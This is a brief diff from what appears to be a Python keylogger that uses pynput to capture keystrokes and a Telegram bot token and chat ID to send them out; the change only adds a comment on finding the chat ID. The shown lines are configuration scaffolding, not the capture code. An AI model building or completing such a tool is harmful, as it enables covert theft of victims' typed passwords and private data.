@@ -9,7 +9,7 @@ from pynput import keyboard
 class Data():
     def __init__(self):
         self.token = ''  #Telegram bot api token
-        self.chatID = '' #Chat id in which bot will send messages(you need to add bot in this chat)
+        self.chatID = '' #Chat id in which bot will send messages(you need to add bot in this chat) to get chat id use @cid_bot
 
 global mainstr, timeLaps
 
